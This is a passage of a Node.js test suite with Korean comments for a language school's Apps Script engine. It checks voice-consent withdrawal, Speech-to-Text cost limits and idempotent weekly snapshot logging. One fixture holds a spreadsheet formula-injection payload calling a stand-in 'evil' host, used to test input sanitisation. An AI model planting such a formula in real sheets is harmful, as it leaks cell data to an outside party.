  assert.equal(hdr.indexOf('전사'), 6, '전사 열 위치가 밀렸다 — voiceTranscribe_의 getRange(row, 7, 1, 3)이 엉뚱한 칸을 쓴다');
});

test('철회 실행 경로가 있다 — 무기한 보관의 유일한 삭제 트리거', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const s = tb.indexOf('function voiceWithdraw(');
  assert.notEqual(s, -1, '철회 실행 함수가 없다 — 동의서의 "철회하면 삭제합니다"가 실행 수단 없는 약속이 된다');
  const fn = tb.slice(s, tb.indexOf('// ── A-3.', s));
  // 지워야 할 네 곳이 모두 있어야 약속이 참이 된다
  assert.ok(fn.includes('setTrashed(true)'), 'Drive 원본을 지우지 않는다');
  assert.ok(fn.includes('deleteRow('), 'voice_log 행을 지우지 않는다');
  assert.ok(fn.includes('목소리성장카드'), '성장 카드에 박힌 첫 목소리 URL이 남는다');
  assert.ok(fn.includes('아니요, 원하지 않습니다'), '동의를 되돌리지 않는다 — 그날 밤 스위프가 다시 적재한다');
  // 비가역이므로 미리보기가 기본이어야 한다
  assert.ok(/confirm !== true/.test(fn), '확인 없이 즉시 삭제한다 — 오타 하나로 남의 기록이 사라진다');
  const preview = fn.slice(fn.indexOf('confirm !== true'), fn.indexOf('// ① Drive'));
  assert.ok(preview.includes('return'), '미리보기가 조기 반환하지 않는다');
  // 행 삭제는 아래에서 위로 — 위에서부터 지우면 인덱스가 밀려 엉뚱한 행이 지워진다
  assert.ok(/sort\(\(a, b\) => b - a\)[\s\S]{0,40}deleteRow/.test(fn),
    'voice_log 행을 내림차순으로 지우지 않는다 — 인덱스가 밀려 다른 학생 기록이 지워진다');
});

/* ── ⑨ STT(GCP Speech-to-Text) — 비용·재시도·라이브 리스크 ─────────── */

test('STT는 매니페스트 OAuth 스코프를 건드리지 않는다(트리거 10개 동시 사망 방지)', () => {
  const mf = JSON.parse(fs.readFileSync(path.join(ROOT, 'appsscript.json'), 'utf8'));
  assert.ok(!mf.oauthScopes,
    'appsscript.json에 oauthScopes가 생겼다 — 명시하는 순간 자동 추론이 꺼져 누락된 스코프의 서비스가 전부 죽는다. ' +
    '추가하려면 SpreadsheetApp·DriveApp·FormApp·DocumentApp·MailApp·ScriptApp·UrlFetchApp·Session을 전부 나열했는지 확인하고 이 검사를 갱신하라');
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  assert.ok(tb.includes('computeRsaSha256Signature'), '서비스 계정 JWT 경로가 없다 — 스코프 없이 cloud-platform 토큰을 받을 방법이 사라진다');
});

test('STT는 일일 상한으로 비용 폭주를 막는다', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  assert.ok(/const STT_DAILY_CAP = \d+/.test(tb), '일일 상한 상수가 없다 — 유료 API가 무한정 돈다');
  const fn = tb.slice(tb.indexOf('function voiceTranscribe_('), tb.indexOf('function voiceSttStatus('));
  assert.ok(fn.includes('STT_DAILY_CAP - used'), '상한을 실제 예산 계산에 쓰지 않는다');
  assert.ok(/budget <= 0\) return/.test(fn), '상한 소진 시 조기 종료하지 않는다');
  assert.ok(fn.includes('STT일일사용'), '사용량을 기록하지 않는다 — 다음 실행이 상한을 모른다');
  assert.ok(/todo\.slice\(0, budget\)/.test(fn), '예산만큼만 처리하지 않는다');
});

test('실패한 전사는 자동 재시도하지 않는다(같은 오류로 과금 반복 방지)', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const fn = tb.slice(tb.indexOf('function voiceTranscribe_('), tb.indexOf('function voiceSttStatus('));
  assert.ok(/if \(state && state !== '대기'\) return/.test(fn),
    '실패 상태 행을 걸러내지 않는다 — 미지원 포맷 하나가 매일 밤 과금된다');
  assert.ok(fn.includes("'실패: '"), '실패 사유를 상태 칸에 남기지 않는다 — 원인을 알 수 없다');
});

test('보낼 수 없는 파일은 API에 닿기 전에 거른다', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const fn = tb.slice(tb.indexOf('function sttOne_('), tb.indexOf('// ── A-2c.'));
  const gate = fn.indexOf('STT_OK_MIME.indexOf(mime) === -1');
  const size = fn.indexOf('STT_MAX_BYTES');
  const call = fn.indexOf('speech:recognize');
  assert.ok(gate !== -1 && gate < call, '미지원 포맷을 API에 보낸다 — 실패인데 과금될 수 있다');
  assert.ok(size !== -1 && size < call, '크기 초과 파일을 걸러내지 않는다');
  assert.ok(!코드만(fn).includes("encoding:"), 'encoding을 고정한다 — 잘못 지정하면 인식이 깨진다(헤더 자동 인식에 맡길 것)');
});

test('전사는 성장 카드보다 먼저 돈다(같은 밤에 전사문이 카드에 실리도록)', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const nightly = tb.slice(tb.indexOf('function 교재연동Nightly()'), tb.indexOf('// ── A-1.'));
  const t = nightly.indexOf('voiceTranscribe_');
  const g = nightly.indexOf('buildVoiceGrowthCards_');
  assert.ok(t !== -1, '야간 배치에 전사가 편입되지 않았다');
  assert.ok(t < g, '전사가 성장 카드보다 뒤에 있다 — 전사문이 하루 늦게 실린다');
});

test('STT 진단 함수가 실제 응답 코드를 보여준다(추측 금지)', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const fn = tb.slice(tb.indexOf('function voiceSttStatus('), tb.indexOf('// ── A-3.'));
  assert.ok(fn.includes('getResponseCode()'), '진단이 실제 API를 호출하지 않는다 — 설정 문제를 추측으로 답하게 된다');
  ['403', '401', '400'].forEach((c) => assert.ok(fn.includes(c), `진단이 ${c} 응답을 구분하지 않는다`));
  assert.ok(fn.includes('getContentText()'), '실패 시 응답 원문을 보여주지 않는다');
});

test('voiceConsentMap_은 열이 없으면 null(보류)을 돌려준다', () => {
  const fn = section('function voiceConsentMap_(', 'function voiceConsentStat_(');
  assert.ok(/if \(ci === -1 \|\| si === -1\) return null/.test(fn),
    '동의 열·학생ID 열이 없을 때 빈 맵을 주면 전원이 통과한다');
  assert.ok(/catch \(e\)[\s\S]{0,80}return null/.test(fn), '예외 시 null(보류)이 아니다');
});

test('동의 문항은 제목만 보고 스킵하지 않는다 — 문구 개정이 라이브 폼에 닿아야 한다', () => {
  const fn = section('function migrateConsentV186()', 'function voiceConsentStat_(');
  assert.ok(fn.includes('const syncHelp'), '도움말 동기화 로직이 없다 — 보관 기간을 바꿔도 학생이 읽는 문장은 옛것으로 남는다');
  // [v9.138] 몽골어 병기가 붙으면서 한 겹 감싸졌다 — 단일 소스(VOICE_CONSENT_HELP)는 그대로이고,
  //   조립은 **한 곳(HELP_B)**에서만 일어나야 한다(동기화 경로와 신규 생성 경로가 다른 문장을 쓰면 두 벌이 된다).
  assert.ok(fn.includes('const HELP_B = 동의문구_(VOICE_CONSENT_HELP, CONSENT_HELP_B_MN)'), '음성 동의(B) 문구가 단일 소스+병기 래퍼로 조립되지 않는다');
  assert.ok(fn.includes('syncHelp(titles.indexOf(B), HELP_B'), '음성 동의(B) 동기화 경로가 조립된 문구를 쓰지 않는다');
  assert.ok(/setHelpText\(HELP_B\)/.test(fn), '신규 생성 경로도 같은 조립본을 써야 한다(두 벌 방지)');
  assert.equal((fn.match(/동의문구_\(VOICE_CONSENT_HELP/g) || []).length, 1, '음성 동의 문구 조립이 2곳 이상 — 두 벌이 되면 학생마다 읽은 문장이 달라진다');
  /* 동기화가 제목·문항을 건드리면 시트 착지와 기존 응답이 깨진다(제목 = 헤더명 = 착지 키).
   * [v18.9] **선택지는 예외로 허용한다** — 거부 선택지를 없애는 개정이 라이브 폼에 닿아야 하는데,
   *   금지해 두면 도움말만 바뀌고 화면엔 옛 선택지가 남은 채 "갱신했습니다"가 나온다. 선택지 변경은
   *   열 이름을 바꾸지 않으므로 착지에 영향이 없고, 이미 접수된 응답 값도 시트에 그대로 남는다. */
  const sync = fn.slice(fn.indexOf('const syncHelp'), fn.indexOf('const A = CONSENT_Q_TITLE'));
  const 동기화코드 = 코드만(sync); // 부정 단언 전용
  ['setTitle', 'deleteItem'].forEach((bad) =>
    assert.ok(!동기화코드.includes(bad), `도움말 동기화가 ${bad}를 호출한다 — 열 착지·기존 응답이 깨진다`));
  assert.ok(sync.includes('it.setChoiceValues(choices)'), '동기화가 선택지를 정본으로 맞추지 않는다 — 선택지 개정이 라이브 화면에 영원히 안 닿는다');
});

test('출석 원본은 실행당 1회만 읽는다(반 18개 × 전체 읽기 방지)', () => {
  const fn = section('function attDayMapCached_(', '/* [v9.99] 🔈 발화 지수');
  assert.ok(fn.includes('if (TALK_ATT_CACHE_) return TALK_ATT_CACHE_'), '출석 읽기 메모이즈가 없다');
  const idx = section('function talkIndexOf_(', '/* [v9.99] 학생용 오늘의 만남');
  assert.ok(!코드만(idx).includes("getSheetByName('attendance')"),
    '발화 지수가 attendance를 직접 읽는다 — 캐시를 우회하면 반마다 전체 읽기가 된다');
});

/* ── ⑨ [vNEXT] 결과 저장 — 재고 버리던 발화 지수를 남긴다(세계판 대조 08-14: 말하기 평가의 결과가 안 남는 칸) ── */

test('발화 지수 스냅샷이 weeklyJobs에 배선돼 있고, 리포트 섹션 실행보다 먼저 적재한다', () => {
  // 만들어만 두고 아무도 안 부르는 상태 차단(v9.90 ROLE_TALK 사고 계열) + 순서: 소비자(weeklyReport)가 같은 실행에서 낡은 로그를 읽지 않게
  const wj = section('function weeklyJobs()', '\n}');
  const snapAt = wj.indexOf("safeRun('talkIndexSnapshot'");
  assert.ok(snapAt > -1, 'weeklyJobs가 talkIndexSnapshot_를 부르지 않는다 — 로그가 영원히 빈다');
  const secAt = wj.indexOf('const sections = [');
  assert.ok(secAt > -1, 'weeklyJobs 섹션 배열 표식을 찾지 못함');
  assert.ok(snapAt < secAt, '스냅샷 적재가 리포트 섹션 실행 뒤에 있다 — 주간 리포트 꼬리가 지난주 로그를 읽는다');
});

test('주간 리포트 꼬리가 talk_index_log를 읽는다 — 소비자 0이면 저장은 미완성(수집은 도달까지가 한 벌)', () => {
  const wr = section('function weeklyReport(', '\n}');
  assert.ok(/getSheetByName\(TALK_INDEX_LOG_SHEET\)/.test(wr), '주간 리포트가 발화 지수 로그를 읽지 않는다');
  assert.ok(wr.includes('전주'), '전주 대비가 없다 — 저장의 존재 이유(궤적)를 소비자가 안 쓴다');
  // 시트 이름은 상수 하나에서 파생 — 리터럴이 두 곳이면 언젠가 갈라진 쪽이 조용히 빈 시트를 읽는다
  assert.equal((코드정제.match(/'talk_index_log'/g) || []).length, 1,
    "시트 이름 리터럴 'talk_index_log'가 상수 선언 밖에도 있다 — 이름이 갈라진다");
  const snap = section('function talkIndexSnapshot_(', '/* [v9.99] 학생용 오늘의 만남');
  assert.ok(/ensureSheet\(ss, TALK_INDEX_LOG_SHEET, TALK_INDEX_LOG_HEADERS\)/.test(snap), '스냅샷이 상수로 시트를 보장하지 않는다');
});

test('발화 지수 로그 상수 이름이 회화 로그(talk_log)와 안 겹친다 — 전역 const 재선언은 라이브를 통째로 죽인다', () => {
  /* 실측 08-14: 처음 이 상수를 `TALK_LOG_HEADERS` 로 지었더니 엔진_수집.js 의 회화 로그 상수와 충돌했다.
   *   node --check 는 **파일 단위**라 초록이었고, Apps Script 는 전역을 합쳐 초기화하므로 라이브만 죽는다
   *   (「테스트는 통과하는데 라이브만 죽는다」의 그 계급 — tests/_engine-source.js 머리말 2번과 같은 사고).
   *   여기서는 이름 겹침을 직접 센다 — 합본 평가 검사(월키원인차단)는 다른 파일이라 이 파일만 보는 사람이 못 본다. */
  ['TALK_INDEX_LOG_SHEET', 'TALK_INDEX_LOG_HEADERS'].forEach((n) => {
    const decl = (code.match(new RegExp('const ' + n + '\\s*=', 'g')) || []).length;
    assert.equal(decl, 1, `엔진 전역에 const ${n} 선언이 ${decl}개다 — 1개여야 한다(재선언=프로젝트 전체 SyntaxError)`);
  });
});

test('스냅샷 쓰기가 공용 소독 통로를 탄다 — 이름이 «=»로 시작하면 셀이 라이브 수식이 된다', () => {
  /* 반·student_id·이름은 상담시트·폼에서 온 남의 글이 profiles→groups 를 거쳐 흘러온 원문이다.
   *   앞단에서 붙인 아포스트로피는 저장 때 소비돼 getValues 가 원문을 돌려주므로(Code.js:1036) 여기서 다시 굳는다.
   *   append 형 로그의 선례(lesson_close·lecture_view)와 같은 통로여야 한다. */
  const snap = section('function talkIndexSnapshot_(', '/* [v9.99] 학생용 오늘의 만남');
  assert.ok(/setValues\(행소독_\(/.test(snap),
    '스냅샷이 맨몸 setValues 로 쓴다 — 학생 이름 칸의 =IMPORTDATA 가 시트에서 살아난다');
});

// 스냅샷 함수를 실제로 실행한다 — 문구 검사로는 멱등(재실행 안전)을 못 잡는다
function loadSnapshot() {
  const src = section("const TALK_INDEX_LOG_SHEET = 'talk_index_log'", '/* [v9.99] 학생용 오늘의 만남');
  /* [v9.235] `반키_` 는 이 구간 «밖»(groupBoardOf_ 앞)에 산다 — 스텁을 지어 넣지 않고 같은 소스에서
   *   진짜 함수를 잘라 붙인다. 스텁은 사본이라 실물이 퇴행해도 이 시험은 계속 초록이고, 그 침묵이
   *   정확히 이 회귀가 막으려는 실패 모양이다(safety.test.js:1061 과 같은 규약). */
  const 반키src = section('function 반키_(', '/* --- 그 반의 오늘');
  const names = ['seasonStartOf_', 'seasonWeekOf_', 'seasonLabelOf_', 'SEASON_WEEKS',
    'ensureSheet', 'quietScoreMap_', 'talkIndexOf_', 'Logger', '행소독_', 'seasonKeyOf_', 'LockService'];
  return (stub) => new Function(...names, `${반키src}\n${src}\nreturn talkIndexSnapshot_;`)(...names.map((n) => stub[n]));
}

/* 시트를 흉내 낼 때 «아포스트로피 소비»까지 흉내 낸다 — 실제 Sheets 는 저장 시 접두 `'`를 먹고
 *   getValues 가 원문을 돌려준다(Code.js:1036). 그걸 안 흉내 내면 소독을 켠 순간 멱등 키가 갈려
 *   테스트만 빨개지거나(거짓 적색) 반대로 실제 위험을 못 본다. */
function fakeLogSheet() { // 헤더 1행 가정 — data는 2행부터의 실데이터만 담는다
  const 저장 = (v) => (typeof v === 'string' && v[0] === "'" ? v.slice(1) : v);
  return {
    data: [],
    raw: [],   // Sheets 에 «건넨» 원본 — 저장 후엔 아포스트로피가 소비돼 안 보이므로 따로 잡아 둔다
    텍스트열: {},  // 1-기반 열 번호 → 1 (setNumberFormat('@') 로 못박은 칸)
    getLastRow() { return this.data.length + 1; },
    getMaxRows() { return this.data.length + 1000; },
    /* 🔑 실제 Sheets 는 «자동» 서식 칸에 들어온 'yyyy-MM-dd' 문자열을 **Date 로 삼킨다** — 텍스트(@)로
     *   못박은 칸만 문자열로 남는다. 이걸 안 흉내 내면 멱등 시험이 라이브와 «다른 것»을 잰다:
     *   08-14 실측에서 이 흉내가 없어 「재실행이 행을 안 늘린다」가 초록인 채 라이브만 중복 적재였다. */
    삼킴(v, 열) {
      if (this.텍스트열[열]) return v;
      if (typeof v === 'string' && /^\d{4}-\d{2}-\d{2}$/.test(v)) {
        const d = new Date(v + 'T00:00:00');
        if (!isNaN(d.getTime())) return d;
      }
      return v;
    },
    getRange(r, c, n, w) {
      const self = this;
      return {
        getValues() { return self.data.slice(r - 2, r - 2 + n).map((row) => row.slice(c - 1, c - 1 + w)); },
        setNumberFormat(f) { if (f === '@') for (let i = 0; i < (w || 1); i++) self.텍스트열[c + i] = 1; },
        setValues(v) {
          v.forEach((row, i) => {
            self.raw.push(row.slice());
            self.data[r - 2 + i] = row.map((cell, j) => self.삼킴(저장(cell), c + j));
          });
        }
      };
    }
  };
}

function snapshotRig() {
  const pfRows = [['S1', '바트', '', 'student', '평일11A'], ['S2', '사란', '', 'student', '평일11A']];
  const pfSheet = {
    getLastRow: () => pfRows.length + 1,
    getRange: (r, c, n, w) => ({ getValues: () => pfRows.slice(r - 2, r - 2 + n).map((row) => row.slice(c - 1, c - 1 + w)) })
  };
  const log = fakeLogSheet();
  let ensureCalls = 0, capturedHeaders = null;
  const 잠금 = { 잡음: 0, 품: 0 };
  const 받은when = [];
  const rig = {
    log,
    잠금,
    받은when,                        // talkIndexOf_ 가 실제로 받은 «잰 시각» — 분모 판정의 재료
    던질반: null,                    // 이 반에서 talkIndexOf_ 가 터진다(실패 격리·보고 시험)
    ensureCalls: () => ensureCalls,
    headers: () => capturedHeaders,
    ss: { getSheetByName: (n) => (n === 'profiles' ? pfSheet : null), getSpreadsheetTimeZone: () => 'Asia/Ulaanbaatar' },
    stub: {
      seasonStartOf_: () => new Date(2027, 0, 4),
      seasonWeekOf_: () => 2,
      seasonLabelOf_: () => '2027-01-04',
      SEASON_WEEKS: G.SEASON_WEEKS,
      ensureSheet: (ss2, name, headers) => { ensureCalls++; capturedHeaders = headers; return log; },
      quietScoreMap_: () => ({}),
      /* 실물과 같은 규약(엔진_셋업확장.js:1545) — Date 든 굳은 텍스트든 'yyyy-MM-dd' 한 글자로 접는다. */
      seasonKeyOf_: (v) => (v instanceof Date && !isNaN(v.getTime())
        ? [v.getFullYear(), String(v.getMonth() + 1).padStart(2, '0'), String(v.getDate()).padStart(2, '0')].join('-')
        : String(v == null ? '' : v).trim()),
      LockService: { getScriptLock: () => ({ waitLock() { 잠금.잡음++; }, releaseLock() { 잠금.품++; } }) },
      talkIndexOf_: (ss2, cN, when) => (받은when.push(when), rig.던질반 === cN
        ? (() => { throw new Error('groups 읽기 실패(흉내)'); })() : [
        // 첫 학생 이름은 폼에서 온 「남의 글」 — 상담시트에 이렇게 적히면 profiles→groups 를 거쳐 그대로 흘러온다
        { sid: 'S1', name: '=IMPORTDATA("https://evil/?d="&A1)', grp: 1, got: 3, max: 6, quiet: 0, pct: 50 },
        { sid: 'S2', name: '사란', grp: 1, got: 6, max: 6, quiet: 0, pct: 100 },
        { sid: 'S9', name: '신입', grp: 1, got: 0, max: 0, quiet: 0, pct: 0 } // 아직 잴 차시 없음 — 행 금지
      ]),
      Logger: { log() {} },
      // 실물과 같은 규약(Code.js 행소독_ → 셀안전_): 문자열만 소독, Date·number 는 타입 보존
      행소독_: (rows) => rows.map((r) => r.map((v) =>
        (typeof v === 'string' && /^[=+\-@\t\r]/.test(v) ? "'" + v : v)))
    }
  };
  return rig;
}

test('스냅샷은 멱등이다 — 같은 (시즌·주차) 재실행이 행을 늘리지 않는다', () => {
  const rig = snapshotRig();
  const snap = loadSnapshot()(rig.stub);
  const out1 = snap(rig.ss);
  assert.equal(rig.log.data.length, 2, 'max=0 학생을 빼고 2행이어야 한다: ' + rig.log.data.length);
  assert.ok(out1.includes('신규 2행'), '요약이 신규 행 수를 말하지 않는다: ' + out1);
  assert.equal(rig.log.data[0].length, rig.headers().length, '행 폭이 헤더 폭과 다르다 — 열이 밀린다');
  // 소독은 «건네는 값»에서 확인한다 — 저장 후엔 시트가 아포스트로피를 먹어 원문으로 돌아온다
  assert.equal(rig.log.raw[0][5], "'=IMPORTDATA(\"https://evil/?d=\"&A1)",
    '이름 칸이 소독 없이 시트로 갔다 — 그 셀은 라이브 수식이 된다');
  assert.equal(rig.log.data[0][5], '=IMPORTDATA("https://evil/?d="&A1)',
    '왕복값이 원문이 아니다 — 시트의 아포스트로피 소비 규약과 어긋난다');
  const out2 = snap(rig.ss);
  assert.equal(rig.log.data.length, 2, '재실행이 행을 복제했다: ' + rig.log.data.length);
  assert.ok(out2.includes('신규 0행') && out2.includes('중복 스킵 2행'),
    '재실행 요약이 0을 분모와 함께 말하지 않는다: ' + out2);
});

test('시즌 미설정이면 시트를 만들지도 쓰지도 않는다 (개원 전 무소음)', () => {
  const rig = snapshotRig();
  rig.stub.seasonStartOf_ = () => null;
  const out = loadSnapshot()(rig.stub)(rig.ss);
  assert.ok(out.includes('적재 없음'), '시즌 미설정인데 적재를 시도한다: ' + out);
  assert.equal(rig.ensureCalls(), 0, '시즌 미설정인데 시트를 만들었다');
});

/* ── [vNEXT] ①배포 검수 P1 6건 처분 — 전부 «라이브에서만 참»이라 옛 회귀가 못 봤다 ────────────
 * 08-14 실측: 코드가 라이브에 나간 뒤 GPT 배포 검수가 6건을 냈고 하나도 오탐이 아니었다.
 * 공통 급소는 「가짜 시트가 라이브보다 착하다」였다 — 아래 첫 시험이 그 흉내를 실물 쪽으로 당긴다. */

test('🔴 시즌 칸을 시트가 «날짜로 삼켜도» 멱등이다 — 안 접으면 재실행마다 같은 주차가 통째로 쌓인다', () => {
  const rig = snapshotRig();
  /* 이미 라이브에 들어가 Date 로 굳은 옛 행을 심는다(자동 서식 칸에 'yyyy-MM-dd' 를 쓰면 이렇게 된다).
   *   옛 판은 String(Date) = 'Mon Jan 04 2027…' 과 '2027-01-04' 를 대조해 **영영 안 맞았다.** */
  rig.log.data.push([new Date(), new Date('2027-01-04T00:00:00'), 2, '평일11A', 'S1', '바트', 3, 6, 0, 50]);
  const out = loadSnapshot()(rig.stub)(rig.ss);
  assert.ok(out.includes('신규 1행') && out.includes('중복 스킵 1행'),
    '날짜로 굳은 기존 행을 못 알아봐 중복 적재했다: ' + out);
  assert.equal(rig.log.data.length, 2, '행이 늘었다 — 멱등이 깨졌다: ' + rig.log.data.length);
});

test('🔴 시즌 칸을 텍스트로 못박고 쓴다 — 읽기 정규화만으론 «새 행»이 계속 날짜로 굳는다', () => {
  const rig = snapshotRig();
  loadSnapshot()(rig.stub)(rig.ss);
  assert.ok(rig.log.텍스트열[2], '시즌 칸(B열)을 텍스트로 안 박았다 — 다음 적재도 날짜로 삼켜진다');
  assert.equal(typeof rig.log.data[0][1], 'string',
    '저장된 시즌 칸이 문자열이 아니다 — 시트가 삼켰다: ' + Object.prototype.toString.call(rig.log.data[0][1]));
});

test('🔴 분모는 «끝난 차시»까지다 — 월요일 07시 적재가 그날 수업을 미리 세면 안 된다', () => {
  const rig = snapshotRig();
  const 월요일아침 = new Date(2027, 0, 11, 7, 0, 0);
  loadSnapshot()(rig.stub)(rig.ss, null, 월요일아침);
  assert.ok(rig.받은when.length, 'talkIndexOf_ 를 아예 안 불렀다');
  const w = rig.받은when[0];
  assert.ok(w instanceof Date, '잰 시각을 Date 로 안 넘겼다');
  assert.equal(w.getDate(), 10, '잰 시각이 실행일(11일) 그대로다 — 안 한 월요일 차시가 분모에 든다: ' + w);
  assert.ok(w < 월요일아침, '잰 시각이 실행 시각보다 앞이 아니다');
});

test('🔴 반 하나가 터져도 조용히 넘어가지 않는다 — 실패가 safeRun 의 오류 경로로 «올라간다»', () => {
  /* [v9.235] 예전엔 실패 반을 «요약 문자열»에만 실었다. 그런데 그 문자열은 :1094 에서 `Logger.log` 로만
   *   가서 `safeRun` 은 배치를 성공으로 보고했다 — 실패 메일 0·재시도 0(검수 05a4f9b9c40e).
   *   그래서 «문자열에 실렸는지»가 아니라 «던지는지»를 잰다: 그게 알림·재시도가 도는 유일한 통로다. */
  const rig = snapshotRig();
  rig.던질반 = '평일11A';
  let 던진것 = null;
  try { loadSnapshot()(rig.stub)(rig.ss); } catch (e) { 던진것 = e; }
  assert.ok(던진것, '실패한 반이 있는데 정상 반환했다 — safeRun 이 성공으로 보고하고 실패 메일도 재시도도 안 돈다');
  assert.ok(/실패 반 1개/.test(던진것.message), '몇 개 반이 빠졌는지 안 말한다: ' + 던진것.message);
  assert.ok(던진것.message.includes('평일11A'), '어느 반이 빠졌는지 안 말한다 — 이름이 없으면 손이 못 간다: ' + 던진것.message);
  assert.equal(rig.log.data.length, 0, '터진 반의 행이 어딘가에서 만들어졌다');
});

test('🔴 읽기·검사·쓰기를 락으로 감싸고, 터져도 반드시 푼다', () => {
  const rig = snapshotRig();
  loadSnapshot()(rig.stub)(rig.ss);
  assert.equal(rig.잠금.잡음, 1, '스크립트 락을 안 잡는다 — 겹쳐 돌면 같은 키가 나란히 붙는다');
  assert.equal(rig.잠금.품, 1, '락을 안 풀었다');

  const rig2 = snapshotRig();
  rig2.stub.ensureSheet = () => { throw new Error('시트 보장 실패(흉내)'); };
  assert.throws(() => loadSnapshot()(rig2.stub)(rig2.ss), /시트 보장 실패/);
  assert.equal(rig2.잠금.품, 1, '락 «안»에서 터졌는데 안 풀었다 — 다음 실행이 30초를 통째로 기다리다 죽는다');
});

test('🔴 주간 리포트는 «마지막 물리 행»을 이번 주로 삼지 않는다 — 낡은 기록과 「기록 없음」은 다른 상태다', () => {
  const wr = section('function weeklyReport(', '\n}');
  const 꼬리 = wr.slice(wr.indexOf('TALK_INDEX_LOG_SHEET'));
  assert.ok(!/rowsT\[rowsT\.length - 1\]/.test(꼬리),
    '마지막 물리 행을 이번 주로 삼는다 — 이번 주 0행이면 지난주 숫자를 이번 주라고 보고한다');
  assert.ok(/seasonWeekOf_\(/.test(꼬리), '현재 주차를 «지금»에서 계산하지 않는다');
  assert.ok(/seasonKeyOf_\(/.test(꼬리), '시즌 칸을 접어 읽지 않는다 — 시트가 날짜로 삼킨 행이 대조에서 빠진다');
});

/* ── [v9.235] 반 키 접기 + 실패 전파 (재검수 차단급 2건 · 대기열 #Q78) ───────────────── */

/* profiles 를 갈아끼운 rig — 반 이름·반 개수를 시험마다 바꾼다(기본 rig 는 「평일11A」 한 반 고정).
 *   sid 를 반 이름에서 파생시켜 반마다 다르게 한다: 같은 sid 가 두 반에서 나오면 둘째 반이 멱등 키에
 *   걸려 «중복 스킵»이 되고, 그러면 「나머지 반은 살아남았나」를 재려던 시험이 엉뚱한 것을 잰다. */
function 반여럿Rig(반들) {
  const rig = snapshotRig();
  const pfRows = 반들.map((c, i) => ['S' + (i + 1), '학생' + (i + 1), '', 'student', c]);
  const pf = {
    getLastRow: () => pfRows.length + 1,
    getRange: (r, c, n, w) => ({ getValues: () => pfRows.slice(r - 2, r - 2 + n).map((row) => row.slice(c - 1, c - 1 + w)) })
  };
  rig.ss = { getSheetByName: (n) => (n === 'profiles' ? pf : null), getSpreadsheetTimeZone: () => 'Asia/Ulaanbaatar' };
  rig.받은반 = [];                    // talkIndexOf_ 가 실제로 받은 반 키 — 접기 판정의 재료
  rig.stub.talkIndexOf_ = (ss2, cN) => {
    rig.받은반.push(cN);
    if (rig.던질반 === cN) throw new Error('groups 읽기 실패(흉내)');
    return [{ sid: cN + '-1', name: '학생', grp: 1, got: 3, max: 6, quiet: 0, pct: 50 }];
  };
  return rig;
}

test('🔴 반 표시명의 «(시간)»을 접어서 넘긴다 — 안 접으면 그 반이 통째로 «빈 후보»가 된다', () => {
  /* `profiles` E열은 「정규반2(9시)」처럼 시간을 달고 오는데 `groups` B열은 「정규반2」다(`assignGroups`
   *   가 그렇게 접어서 쓴다). 원문을 그대로 넘기면 `groupBoardOf_` 의 `String(r[1]) === cls` 가 안 맞아
   *   그 반 학생 «전원»이 조용히 빠진다 — 그리고 0건은 정상과 같은 얼굴이다(검수 d8461c489202).
   *   스텁이 아니라 실물 `반키_` 를 잘라 넣고 잰다(loadSnapshot 주석 참고). */
  const rig = 반여럿Rig(['정규반2(9시)']);
  loadSnapshot()(rig.stub)(rig.ss);
  assert.deepEqual(rig.받은반, ['정규반2'],
    'profiles E열 원문을 그대로 넘겼다 — groups B열과 안 맞아 그 반이 조용히 빠진다: ' + JSON.stringify(rig.받은반));
  assert.equal(rig.log.data.length, 1, '접힌 반의 행이 안 쌓였다');
  assert.equal(rig.log.data[0][3], '정규반2', '로그의 class 칸이 접힌 키가 아니다 — 소비자가 반별로 못 모은다');
});

test('🔴 한 반이 터져도 나머지 반 적재는 살린다 — 던지는 자리는 «쓰기 뒤»여야 한다', () => {
  /* 실패를 올리는 것과 나머지를 버리는 것은 다른 일이다. 반 하나가 터졌다고 그 주를 통째로 안 남기면
   *   재시도가 돌 때까지 «성한 반»의 그 주 궤적도 같이 사라진다(append 형 로그라 되돌리기도 어렵다). */
  const rig = 반여럿Rig(['평일11A', '평일11B']);
  rig.던질반 = '평일11A';
  let 던진것 = null;
  try { loadSnapshot()(rig.stub)(rig.ss); } catch (e) { 던진것 = e; }
  assert.ok(던진것, '실패가 안 올라갔다 — safeRun 이 성공으로 보고한다');
  assert.equal(rig.log.data.length, 1, '성한 반(평일11B)의 행이 같이 버려졌다: ' + rig.log.data.length);
  assert.equal(rig.log.data[0][3], '평일11B', '살아남은 행이 성한 반의 것이 아니다');
  assert.equal(rig.잠금.품, 1, '락을 안 풀고 던졌다 — 다음 실행이 30초를 통째로 기다리다 죽는다');
});

test('🔴 실패 에러의 «첫 줄»에 행수가 안 들어간다 — dedup 서명이 매번 갈리면 메일 쿼터를 태운다', () => {
  /* `safeRun` 은 에러 «첫 줄 120자»를 서명으로 하루 1통 제한을 건다(엔진_셋업확장.js:1002). 첫 줄에
   *   신규·스킵 행수 같은 변동값이 들어가면 서명이 실행마다 달라져 제한이 풀리고, 10분마다 도는
   *   스위프가 실패 메일로 쿼터를 태워 학부모·미납 알림까지 죽인다(:998 이 경고하는 자기증폭). */
  const rig = 반여럿Rig(['평일11A', '평일11B']);
  rig.던질반 = '평일11A';
  let 던진것 = null;
  try { loadSnapshot()(rig.stub)(rig.ss); } catch (e) { 던진것 = e; }
  const 첫줄 = String(던진것 && 던진것.message).split('\n')[0];
  assert.ok(첫줄.includes('평일11A'), '서명이 될 첫 줄에 실패 반 이름이 없다 — 반이 바뀌어도 같은 서명이 된다: ' + 첫줄);
  assert.ok(!/신규|스킵/.test(첫줄),
    '첫 줄에 행수 같은 변동값이 있다 — 실행마다 서명이 갈려 하루 1통 제한이 풀린다: ' + 첫줄);
});

test('🔴 반 키 접기가 «한 곳»에서만 산다 — 호출부마다 손으로 적으면 새로 난 자리가 그 통로를 안 탄다', () => {
  /* 이 결함이 난 자리가 정확히 그것이다: 접기를 손으로 적어 온 곳이 5곳이었고, 새로 생긴 자리가 안 탔다.
   *   ⚠ 대상은 «이 파일»뿐이다 — 엔진_운영배치.js:3056·3169 는 아직 못 옮겼고(두 세션이 작업중인 파일),
